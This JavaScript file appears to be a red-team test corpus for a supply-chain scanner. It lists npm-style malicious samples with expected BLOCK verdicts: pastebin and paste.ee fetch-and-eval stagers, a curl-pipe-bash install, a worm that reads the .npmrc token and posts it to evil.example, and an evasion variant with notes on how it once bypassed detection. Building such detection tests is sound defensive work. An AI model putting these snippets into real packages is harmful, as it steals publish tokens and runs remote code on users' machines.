// red-team/corpus/supply-chain.js
// Supply-chain worm / postinstall-stager style payloads.

module.exports = [
  {
    id: 'sc-pastebin-eval',
    category: 'supply-chain',
    technique: 'pastebin-fetch-eval',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Fetches a stage-two payload from pastebin (//pastebin BLOCK signature)',
    code: `
      const https = require('https');
      https.get('https://pastebin.com/raw/AbCdEf12', (res) => {
        let d = '';
        res.on('data', (c) => d += c);
        res.on('end', () => eval(d));
      });
      module.exports = {};
    `,
  },
  {
    id: 'sc-paste-ee',
    category: 'supply-chain',
    technique: 'paste-ee-stager',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Second-stage payload host paste.ee',
    code: `
      const url = 'https://paste.ee/r/xxxxx';
      require('https').get(url, (r) => r.on('data', (d) => new Function(d.toString())()));
      module.exports = {};
    `,
  },
  {
    id: 'sc-postinstall-curl-bash',
    category: 'supply-chain',
    technique: 'postinstall-curl-pipe-bash',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Postinstall-style remote installer piped into bash',
    code: `
      const { execSync } = require('child_process');
      execSync('curl -s https://evil.example/install.sh | bash');
      module.exports = {};
    `,
  },
  {
    id: 'sc-worm-selfpropagate',
    category: 'supply-chain',
    technique: 'worm-cred-read-publish',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Worm behaviour: read .npmrc token then exfiltrate to a hardcoded C2 for republish',
    code: `
      const fs = require('fs');
      const rc = fs.readFileSync(require('os').homedir() + '/.npmrc', 'utf8');
      const token = rc.match(/_authToken=(\\S+)/)[1];
      fetch('https://evil.example/harvest', { method: 'POST', body: token });
      module.exports = {};
    `,
  },

  // ── Evasion variant ─────────────────────────────────────────────────────────
  {
    id: 'sc-fetch-eval-generic-host',
    category: 'supply-chain',
    technique: 'generic-host-fetch-eval-chain',
    severity: 'HIGH',
    expected: 'BLOCK',
    knownBypass: false, // closed: REMOTE_FETCH_EXEC rule (Phase 2)
    description: 'Fetches from a non-flagged host and eval\'s the response. Network egress is not chained with eval in any behavioral rule, and the host is not a known-bad literal — slips past as OBSERVE.',
    code: `
      fetch('https://cdn.jsdelivr-mirror.example/a.js')
        .then((r) => r.text())
        .then((t) => (0, eval)(t));
      module.exports = {};
    `,
  },
];
